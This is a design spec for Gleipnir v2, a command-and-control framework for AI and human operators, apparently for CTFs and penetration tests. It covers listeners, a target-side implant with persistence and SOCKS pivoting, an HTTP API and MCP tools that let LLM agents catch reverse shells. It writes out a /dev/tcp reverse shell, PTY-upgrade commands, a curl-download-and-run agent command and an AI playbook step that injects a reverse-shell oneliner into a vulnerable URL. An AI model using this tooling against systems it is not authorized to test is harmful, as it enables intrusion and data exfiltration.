# Spec: Gleipnir v2 - AI-Native C2

## Objective

Gleipnir graduates from a single-protocol reverse shell handler into a lightweight C2 designed for AI operators. Three distinct components with clear boundaries: a **server** that manages listeners and sessions, an **agent** that runs on targets, and **clients** that consume the server's HTTP API.

The goal: any client (LLM agent, CLI, GUI) requests a callback, the server handles the listener/transport/session lifecycle, and the client gets a session it can `exec` on. No manual netcat, no port math, no "which namespace is tun0 on."

### Users

1. **PK playbook actions** - request callbacks, exec on sessions via MCP client
2. **PK orchestrator** - monitors sessions, intervenes when agents are stuck
3. **Human operators** - manage sessions via CLI client, attach for interactive use
4. **Standalone users** - gleipnir without PK, as a netcat/pwncat replacement
5. **GUI operators** - web dashboard for session visibility during CTF/engagements

### Success criteria

- Raw TCP reverse shells captured as sessions alongside native agent sessions
- `gleipnir-cli catch 9001 --mode raw` starts a listener and wraps connections as sessions
- Callback port allocation from the PK action SDK: `ctx.callback()` returns `{ip, port}`
- Works on: raw Linux, macOS+Colima, Docker, Kubernetes, WSL2 without per-scenario hacks
- HTTP REST API serves all operations; every client is a thin wrapper over the same API

## Tech Stack

| Component | Language | Key deps |
|---|---|---|
| `gleipnir-server` | Rust | tokio, axum, serde_json, uuid, tokio-tungstenite |
| `gleipnir-agent` | Rust | tokio (cross-compiled linux-musl, windows-gnu) |
| `gleipnir-cli` | Rust | clap, reqwest |
| MCP client | TypeScript | packages/tooling-mcp (wraps HTTP API) |
| GUI client | TypeScript/React | Future; consumes same HTTP API + WebSocket |

## Architecture

```
┌─────────────────────────────────────────────────────────────────┐
│                     SERVER (gleipnir-server)                     │
│                                                                  │
│  Rust binary. Runs where tun0 is. Knows nothing about PK.       │
│                                                                  │
│  ┌──────────────┐  ┌──────────────┐  ┌──────────────┐           │
│  │ Native       │  │ Raw TCP      │  │ HTTP C2      │           │
│  │ Listener     │  │ Listener     │  │ Listener     │           │
│  │ :4444        │  │ :9001        │  │ :8080        │           │
│  │ (PKRL proto) │  │ (catch any)  │  │ (poll-based) │           │
│  └──────┬───────┘  └──────┬───────┘  └──────┬───────┘           │
│         │                  │                 │                   │
│         └────────┬─────────┴────────┬────────┘                   │
│                  │                  │                             │
│           ┌──────▼──────┐   ┌──────▼──────┐                      │
│           │  Session    │   │  Session    │    HTTP API :6666     │
│           │  (native)   │   │  (raw/http) │◀──── /api/*          │
│           └──────┬──────┘   └──────┬──────┘    + WebSocket       │
│                  │                  │           /ws/sessions/:name│
│                  └────────┬─────────┘                             │
│                           │                                      │
│                    ┌──────▼──────┐                                │
│                    │ Session     │                                │
│                    │ Pool        │                                │
│                    └─────────────┘                                │
│                                                                  │
└──────────────────────────────────────────────────────────────────┘
           ▲                              ▲
           │ PKRL protocol                │ HTTP API
           │                              │
┌──────────┴──────────┐      ┌────────────┴──────────────────────┐
│   AGENT (implant)    │      │          CLIENTS                  │
│                      │      │                                   │
│  Rust binary.        │      │  ┌─────────────┐                  │
│  Runs on target.     │      │  │ gleipnir-cli│ Rust, human use  │
│  Connects back to    │      │  └─────────────┘                  │
│  server.             │      │  ┌─────────────┐                  │
│                      │      │  │ MCP tools   │ TS, LLM agents   │
│  Capabilities:       │      │  └─────────────┘                  │
│  - PTY shell         │      │  ┌─────────────┐                  │
│  - File transfer     │      │  │ PK super-   │ TS, ctx.callback │
│  - SOCKS proxy       │      │  │ visor/SDK   │                  │
│  - Persistence       │      │  └─────────────┘                  │
│  - Platform detect   │      │  ┌─────────────┐                  │
│                      │      │  │ Web GUI     │ React (future)   │
│  No PK dependency.   │      │  └─────────────┘                  │
│  No server dep       │      │                                   │
│  beyond network.     │      │  All clients are equal.           │
│                      │      │  All talk HTTP API.               │
└──────────────────────┘      │  No client is privileged.         │
                              └───────────────────────────────────┘
```

### Key principle: server is PK-agnostic

The server has no concept of engagements, playbooks, or AI agents. It manages listeners, sessions, and tunnels. PK-specific concepts (engagement tagging, `ShellObtained` events, playbook integration) live in the **clients** (MCP tools, supervisor, action SDK). This keeps the server reusable outside PK.

## Components

### 1. Server (`gleipnir-server`)

Single Rust binary. Two modes:

- **Daemon**: `gleipnir-server --api-port 6666 --listen 4444` runs persistently
- **Embedded**: PK's docker-compose runs it as a service

#### Listener types

| Mode | Protocol | Use case | Session quality |
|---|---|---|---|
| `agent` | PKRL binary framing | Persistent access, file transfer, SOCKS | Full PTY, upload/download, SOCKS proxy |
| `raw` | Plain TCP | Catch bash/python/netcat reverse shells | Best-effort PTY, exec via stdin markers |
| `http` | HTTP POST callbacks | Data exfil, staged payloads, one-shot output | Stateless poll-based, no interactive shell |

#### Auto-detection

When a connection arrives on any listener, the server reads the first bytes:
- Starts with PKRL magic (`0x504B524C`)? Native agent session.
- Otherwise? Raw TCP session.

This means a single port can accept both native agents and raw shells. The `mode` on listener creation is a hint for naming and behavior, not a hard gate.

#### Raw TCP session handling

1. Wrap the TCP stream with stdin/stdout forwarding
2. Send `id\n`, parse response to detect shell type and OS
3. If bash/sh detected, attempt PTY upgrade: `python3 -c "import pty;pty.spawn('/bin/bash')"` or `script -qc /bin/bash /dev/null`
4. Command execution: write command + marker (`echo __GLEIPNIR_DONE_$RANDOM__`), read until marker appears
5. Session metadata: OS, user, hostname, shell type, PTY status

#### HTTP C2 session handling

Targets poll for commands:
- `POST /c2/<session>/checkin` - register, get session ID
- `GET  /c2/<session>/task` - poll for next command
- `POST /c2/<session>/result` - submit command output
- `POST /c2/<session>/exfil` - upload file data

Configurable poll interval. Session stays alive as long as target checks in within the timeout.

#### Session lifecycle

1. **Listener opened** - via API. Returns listener ID and allocated port.
2. **Connection received** - protocol detected, session created, auto-named.
3. **Session active** - exec, upload, download, attach via API.
4. **Session idle** - heartbeat/keepalive (native agent) or poll timeout (HTTP).
5. **Session closed** - target disconnects or client kills it. Metadata retained in history.

### 2. Agent (`gleipnir-agent`)

Rust binary, cross-compiled. Runs on the target. Unchanged in protocol; the PKRL framing stays the same. Capabilities:

- PTY shell (full interactive terminal)
- File upload/download (chunked, resumable)
- SOCKS5 proxy (pivot through target)
- Persistence (optional, agent-side only)
- Platform detection (OS, arch, user, hostname)
- Auto-reconnect with jitter

Agent has zero knowledge of PK, engagements, or clients. It connects to a server address and speaks PKRL.

### 3. Clients

All clients are equal consumers of the server's HTTP API. No client has special access.

#### CLI (`gleipnir-cli`)

Rust binary, talks to the server HTTP API.

```bash
# Quick mode: embedded server, one-shot catch
gleipnir catch 4444                        # listen, catch first connection, interactive
gleipnir catch 9001 --mode raw             # catch raw TCP shell

# Client mode: talks to running server
gleipnir --server http://localhost:6666

# Listeners
gleipnir listen 4444                       # open native listener
gleipnir listen 9001 --mode raw            # open raw TCP catcher
gleipnir listen 8080 --mode http           # open HTTP C2 listener
gleipnir listeners                         # list active listeners

# Sessions
gleipnir sessions                          # list all sessions
gleipnir exec <session> "id"              # one-shot command
gleipnir attach <session>                  # interactive terminal (like tmux attach)
gleipnir upload <session> ./local /remote  # upload file
gleipnir download <session> /remote ./local

# Tunnels
gleipnir tunnel <session> 1080             # start SOCKS5 proxy
gleipnir tunnels                           # list active tunnels

# Agent serving
gleipnir serve-agent                       # serve agent binaries via HTTP
```

`gleipnir catch` is the standalone replacement for `ncat -lvnp`. It starts an embedded server, opens a listener, catches the first connection, and drops into an interactive shell. No config, no daemon, no PK.

#### MCP tools (TypeScript, in `packages/tooling-mcp`)

Wraps the HTTP API for LLM agents:

| Tool | Maps to |
|---|---|
| `gleipnir_listen` | `POST /api/listeners` |
| `gleipnir_sessions` | `GET /api/sessions` |
| `gleipnir_exec` | `POST /api/sessions/:name/exec` |
| `gleipnir_upload` | `POST /api/sessions/:name/upload` |
| `gleipnir_download` | `POST /api/sessions/:name/download` |
| `gleipnir_tunnel` | `POST /api/tunnels` |
| `gleipnir_kill` | `DELETE /api/sessions/:name` |

#### PK Action SDK (`ctx.callback()`)

The supervisor's action SDK adds PK-specific logic on top of the HTTP API:

```typescript
interface CallbackInfo {
  ip: string;        // routable IP (tun0 or equivalent)
  port: number;      // allocated listener port
  mode: "agent" | "raw" | "http";
  sessionPrefix: string;
  oneliner: string;  // ready-to-use reverse shell command
}

// In a playbook action:
const cb = await ctx.callback({ mode: "raw" });
// Internally: POST /api/listeners -> allocate port -> detect tun0 IP
// cb = { ip: "10.10.14.81", port: 9001, oneliner: "bash -c '...'" }

await ctx.exec("curl", [vulnUrl, "-d", cb.oneliner]);

// Supervisor polls GET /api/sessions until new session appears
// Emits ShellObtained event -> next playbook action fires
```

The engagement tagging and event emission happen in the SDK client, not in the server.

#### Web GUI (future, React)

Dashboard consuming the same HTTP API + WebSocket:

- **Sessions view**: live table of active sessions (name, target, user, OS, status)
- **Terminal**: xterm.js connected via WebSocket (`/ws/sessions/:name`) for interactive attach
- **Listeners**: create/manage listeners
- **Activity log**: command history per session (from session recording)
- **Agent download**: serve pre-compiled agent binaries for quick deployment

The GUI is a PK SPA page (same stack as `packages/spa`), not a separate app.

## HTTP API

### Listeners

```
POST   /api/listeners
GET    /api/listeners
GET    /api/listeners/:id
DELETE /api/listeners/:id

POST body:
{
  "port": 9001,              // 0 = auto-allocate
  "mode": "raw",             // "agent" | "raw" | "http"
  "bind": "0.0.0.0",         // optional, default 0.0.0.0
  "name_prefix": "bedside",  // session naming prefix
  "auto_pty": true            // attempt PTY upgrade on raw sessions
}

Response:
{
  "id": "lst-a1b2c3",
  "port": 9001,
  "mode": "raw",
  "status": "listening"
}
```

### Sessions

```
GET    /api/sessions
GET    /api/sessions/:name
POST   /api/sessions/:name/exec
POST   /api/sessions/:name/upload
POST   /api/sessions/:name/download
DELETE /api/sessions/:name

GET /api/sessions response:
[
  {
    "name": "bedside-001",
    "mode": "agent",
    "target": "10.129.52.164",
    "user": "www-data",
    "hostname": "data-wrangler",
    "os": "linux",
    "pty": true,
    "connected_at": "2026-07-21T14:30:00Z",
    "last_activity": "2026-07-21T14:35:12Z",
    "listener": "lst-a1b2c3"
  }
]

POST /api/sessions/:name/exec body:
{
  "command": "id",
  "timeout": 30
}

Response:
{
  "output": "uid=33(www-data) gid=33(www-data)",
  "elapsed_ms": 42
}
```

### Tunnels

```
POST   /api/tunnels
GET    /api/tunnels
DELETE /api/tunnels/:id

POST body:
{
  "session": "bedside-001",
  "port": 1080,
  "type": "socks5"
}
```

### WebSocket

```
WS /ws/sessions/:name       Interactive terminal stream (bidirectional bytes)
WS /ws/events               Server-sent events (new session, session closed, etc.)
```

The `/ws/events` stream lets clients react to session changes without polling. Events:

```json
{"event": "session.new", "session": "bedside-001", "mode": "raw", "target": "10.129.52.164"}
{"event": "session.closed", "session": "bedside-001", "reason": "target_disconnect"}
{"event": "listener.connection", "listener": "lst-a1b2c3", "from": "10.129.52.164:43210"}
```

### Agent serving

```
GET /api/agents                          List available agent binaries
GET /api/agents/:platform/:arch          Download agent binary
```

Platforms: `linux`, `windows`. Arches: `amd64`, `arm64`.
Pre-compiled binaries served from a directory. Allows `curl http://server:6666/api/agents/linux/amd64 -o agent && chmod +x agent && ./agent -s server:4444`.

### System

```
GET /api/health
GET /api/info                            Version, uptime, listener/session counts
```

## Deployment Scenarios

The server binds where tun0 is. `pk vpn up` handles topology; the server itself is scenario-agnostic.

| Scenario | tun0 | Server runs | Routing |
|---|---|---|---|
| Raw Linux | Host | Container (port-mapped) or bare binary | Docker `-p` or direct bind |
| macOS + Colima | VM | Container + VM port forward | `pk vpn up` adds socat rules |
| Kubernetes | VPN sidecar pod | Same pod (shared network ns) | Pod port + Service |
| Bare metal (no Docker) | Host | Bare binary | Direct bind |
| WSL2 + WSL VPN | WSL2 | Container or bare binary | Same as raw Linux |
| Cloud hosted | Host or sidecar | Container | Depends on cloud VPN setup |

## Project Structure

```
packages/gleipnir/
  Cargo.toml                # workspace: server, agent, cli
  server/
    Cargo.toml
    src/
      main.rs               # daemon entrypoint (clap args)
      api.rs                 # HTTP API routes (axum)
      ws.rs                  # WebSocket handlers
      listener.rs            # listener manager (multi-mode)
      session.rs             # session pool
      session_native.rs      # PKRL agent session handler
      session_raw.rs         # raw TCP session handler
      session_http.rs        # HTTP C2 session handler
      protocol.rs            # PKRL codec (unchanged)
      socks.rs               # SOCKS5 proxy (unchanged)
      agent_server.rs        # serve agent binaries
    tests/
      integration.rs
      raw_session.rs
      http_c2.rs
  agent/
    Cargo.toml
    src/                     # unchanged
  cli/
    Cargo.toml
    src/
      main.rs               # clap CLI
      client.rs              # HTTP API client (reqwest)
      interactive.rs         # terminal attach (crossterm)
      catch.rs               # embedded server quick-mode
```

Renamed from `relay/` to `server/` to match the mental model.

## Testing

- **Server unit tests**: protocol auto-detection, session naming, raw stream marker parsing
- **Server integration**: spawn server, connect raw TCP, exec command, verify output via API
- **CLI integration**: `gleipnir listen` + `gleipnir exec` round-trip
- **Docker scenario**: compose with a "target" container that sends `bash -i >& /dev/tcp/...`; verify session captured
- **Agent integration**: existing tests, plus verify native+raw on the same port

## Boundaries

### Always
- HTTP API for all server operations (single source of truth)
- Server is PK-agnostic (no engagement/playbook concepts)
- All clients are equal (no privileged access path)
- Raw sessions attempt PTY upgrade automatically

### Ask first
- Adding listener modes beyond agent/raw/http
- Changing the PKRL wire protocol (agent backward compatibility)
- Adding any PK-specific logic to the server

### Never
- Evasion features in server or agent (malleable profiles, sleep jitter obfuscation)
- PK engagement logic in the server (belongs in clients)
- Storing credentials or secrets in session history

## Migration

| Phase | What | Why |
|---|---|---|
| 1 | Add HTTP API (axum) alongside Unix socket. Add raw TCP listener mode. | Core value: raw shell catching. API enables all future clients. |
| 2 | `gleipnir-cli` crate. MCP tools switch to HTTP API. | Human and AI operators both work. |
| 3 | HTTP C2 listener mode. Agent binary serving. | Staged payloads, agent delivery. |
| 4 | PK SDK `ctx.callback()`. Supervisor WebSocket event bridge. | Playbook-driven callback automation. |
| 5 | Web GUI. Session recording/replay. | CTF team visibility. |
| 6 | Deprecate Unix socket API. Remove old MCP socket code. | Cleanup. |

Phase 1 is the CTF blocker. Get raw catch + HTTP API working and the VPN routing problem is solved for all scenarios.

## Open Questions

1. **Agent delivery**: Should the server serve agent binaries (`GET /api/agents/linux/amd64`)? Lets payloads `curl | sh` without pre-staging. Reduces friction but exposes the binary to network inspection.

2. **Session recording**: Record all I/O per session for replay in reports? Useful for CTF writeups and evidence but adds disk I/O. Could be opt-in per session or per listener.

3. **Multi-server federation**: Multiple servers coordinated by PK API (one per VPN/region)? Or one server per engagement? For CTF probably one server is enough; for multi-network pentests, federation adds value.

4. **API auth**: Token-based auth for the HTTP API? Localhost deployments don't need it; cloud-hosted PK does. Could default to no-auth with an `--api-token` flag.

5. **GUI scope**: Separate app or embedded in PK SPA? Leaning toward a page in the PK SPA that talks to the gleipnir server API directly, with WebSocket for live session terminals.
